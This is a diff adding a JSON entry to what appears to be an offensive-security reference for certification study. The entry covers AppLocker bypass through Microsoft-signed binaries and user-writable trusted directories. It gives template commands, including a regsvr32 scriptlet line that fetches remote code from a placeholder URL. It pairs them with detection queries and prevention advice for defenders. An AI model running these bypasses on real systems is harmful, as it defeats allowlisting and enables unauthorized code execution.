@@ -1,0 +1,103 @@
+{
+  "id": "win-applocker-bypass",
+  "name": "AppLocker Bypass via Trusted LOLBins and Writable Paths",
+  "command": "rundll32.exe <dll>,<entrypoint>",
+  "description": "AppLocker allowlisting is bypassed by proxying execution through Microsoft-signed binaries (LOLBins) that are trusted by default rules, or by dropping payloads into default-allowed writable directories. Classic vectors: rundll32, regsvr32 scriptlet (squiblydoo), InstallUtil, MSBuild inline tasks, and writing under C:\\Windows\\Tasks or C:\\Windows\\System32\\spool\\drivers\\color - paths users can write to that the default rules still permit.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Defense Evasion",
+  "subcategory": "Defense Evasion",
+  "certifications": ["CRTP"],
+  "primary_cert": "CRTP",
+  "source": "LOLBAS Project; MITRE ATT&CK T1218; Microsoft AppLocker docs",
+  "tags": ["applocker", "lolbin", "signed-binary-proxy", "squiblydoo", "bypass", "allowlisting"],
+  "mitre": ["T1218", "T1218.011", "T1218.010", "T1127"],
+  "exam": "exam-ok",
+  "notes": "=== WHY DEFAULT RULES LEAK ===\n  The default AppLocker rule set trusts everything under %WINDIR% and %PROGRAMFILES%. Several\n  subdirectories of %WINDIR% are USER-WRITABLE, so a non-admin can place a payload in a trusted path.\n\n=== DEFAULT-ALLOWED WRITABLE PATHS (user-writable, still trusted) ===\n  C:\\Windows\\Tasks\n  C:\\Windows\\Temp (varies)\n  C:\\Windows\\System32\\spool\\drivers\\color\n  C:\\Windows\\tracing\n\n=== SIGNED-BINARY PROXY (LOLBins) ===\n  rundll32.exe <dll>,<entrypoint>              # proxy a DLL export\n  regsvr32 /s /u /i:<url> scrobj.dll           # squiblydoo - scriptlet execution (T1218.010)\n  InstallUtil.exe /logfile= /LogToConsole=false /U <assembly>   # T1218.004 run managed code\n  MSBuild.exe <project.xml>                    # inline task runs C# (T1127)\n\n=== ENUMERATE POLICY FIRST ===\n  Get-AppLockerPolicy -Effective -Xml\n  Get-AppLockerPolicy -Effective | Select -Expand RuleCollections\n  # note which collections are Enforced vs AuditOnly; DLL rules are often not enabled\n\n=== ALTERNATIVES ===\n  AMSI/CLM bypass (if PowerShell is in Constrained Language Mode), HTA/mshta, signed-binary chains.",
+  "examples": [
+    {
+      "label": "Enumerate the effective AppLocker policy",
+      "command": "Get-AppLockerPolicy -Effective -Xml"
+    },
+    {
+      "label": "MSBuild inline-task execution (no compiler needed on disk)",
+      "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe build.xml"
+    },
+    {
+      "label": "Squiblydoo scriptlet via regsvr32",
+      "command": "regsvr32 /s /u /i:<url> scrobj.dll"
+    }
+  ],
+  "references": [
+    {
+      "title": "LOLBAS Project",
+      "url": "https://lolbas-project.github.io/"
+    },
+    {
+      "title": "MITRE ATT&CK T1218 - System Binary Proxy Execution",
+      "url": "https://attack.mitre.org/techniques/T1218/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "dll-hijacking",
+      "note": "DLL search-order abuse is another way to run inside a trusted process.",
+      "rel": "alternative"
+    },
+    {
+      "id": "win-clr-execute-assembly",
+      "note": "InstallUtil/MSBuild proxy managed code; in-memory CLR loading is the next step.",
+      "rel": "next"
+    },
+    {
+      "id": "av-evasion-methods",
+      "note": "AppLocker bypass is part of the broader evasion picture.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "AppLocker trusts binaries by path, publisher, or hash. Microsoft-signed LOLBins pass publisher rules while proxying arbitrary code, and default path rules trust %WINDIR% subtrees that non-admins can write to. DLL enforcement is a separate, often-disabled collection, so rundll32-style proxies run even where EXE rules are enforced.",
+    "prerequisites": "A standard user session on a host with AppLocker in default or incomplete configuration. No admin needed for LOLBin proxying or writing to a user-writable trusted path.",
+    "impact": "T1218 System Binary Proxy Execution. Arbitrary code runs under a trusted, signed process, defeating allowlisting and often blending into normal admin tooling.",
+    "detection": "Alert on LOLBins spawning unusual children or with network/scriptlet arguments: regsvr32 with /i: and a URL (squiblydoo), rundll32 loading a DLL from a user-writable path, InstallUtil/MSBuild launched by Office or a shell, and any process image written under C:\\Windows\\Tasks or spool\\drivers\\color. Script-block logging and EDR command-line capture are key.",
+    "artifacts": "Security 4688 / Sysmon EID 1 process creation with LOLBin command lines; Sysmon EID 11 (FileCreate) under writable %WINDIR% paths; Sysmon EID 7 image loads from unusual directories; AppLocker 8003/8004 (audit/block) events in Microsoft-Windows-AppLocker.",
+    "splunk_spl": "index=wineventlog (EventCode=4688 OR source=\"*Sysmon*\" EventCode=1)\n| search (New_Process_Name=\"*regsvr32.exe\" CommandLine=\"*/i:*http*\") OR (New_Process_Name=\"*rundll32.exe\" CommandLine=\"*\\\\Windows\\\\Tasks\\\\*\") OR New_Process_Name IN (\"*InstallUtil.exe\",\"*MSBuild.exe\")\n| table _time, Computer, ParentImage, New_Process_Name, CommandLine",
+    "elastic_kql": "process.name:(regsvr32.exe or rundll32.exe or InstallUtil.exe or MSBuild.exe) and process.command_line:(*\\/i\\:http* or *\\\\Windows\\\\Tasks\\\\* or *scrobj.dll*)",
+    "sentinel_kql": "DeviceProcessEvents\n| where FileName in~ (\"regsvr32.exe\",\"rundll32.exe\",\"installutil.exe\",\"msbuild.exe\")\n| where ProcessCommandLine has_any (\"/i:http\",\"scrobj.dll\",\"\\\\Windows\\\\Tasks\\\\\",\"spool\\\\drivers\\\\color\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine",
+    "sigma_rules": "proc_creation_win_lolbin_applocker_bypass",
+    "prevention": "Enable the DLL rule collection and switch all collections to Enforce; add explicit deny/path rules for the user-writable %WINDIR% directories (Tasks, tracing, spool\\drivers\\color); block or constrain regsvr32/rundll32/InstallUtil/MSBuild with WDAC; enable Microsoft ASR rules (block Office child processes, block executable content); prefer WDAC over AppLocker for stronger signer-based control.",
+    "sources": [
+      "https://lolbas-project.github.io/",
+      "https://attack.mitre.org/techniques/T1218/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Squiblydoo - regsvr32 remote scriptlet",
+        "logic": "DeviceProcessEvents\n| where FileName =~ \"regsvr32.exe\"\n| where ProcessCommandLine has \"scrobj.dll\" and ProcessCommandLine has_any (\"/i:http\",\"/i:\\\\\\\\\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine",
+        "data_source": "defender-endpoint",
+        "attack": ["T1218.010"],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Rare legitimate COM registration from a network path",
+        "tuning": "Allowlist known software deployment servers"
+      },
+      {
+        "platform": "splunk",
+        "name": "LOLBin executing from a user-writable trusted path",
+        "logic": "index=sysmon EventCode=1 (Image=\"*rundll32.exe\" OR Image=\"*regsvr32.exe\") CommandLine IN (\"*\\\\Windows\\\\Tasks\\\\*\",\"*spool\\\\drivers\\\\color*\",\"*\\\\Windows\\\\tracing*\")\n| table _time, Computer, ParentImage, Image, CommandLine",
+        "data_source": "sysmon",
+        "attack": ["T1218"],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Uncommon; printer color-profile tooling may touch the color directory",
+        "tuning": "Baseline legitimate writers of those directories"
+      }
+    ],
+    "visibility": {
+      "requires": ["sysmon", "windows-security"],
+      "better_with": ["edr", "defender-endpoint"]
+    }
+  }
+}
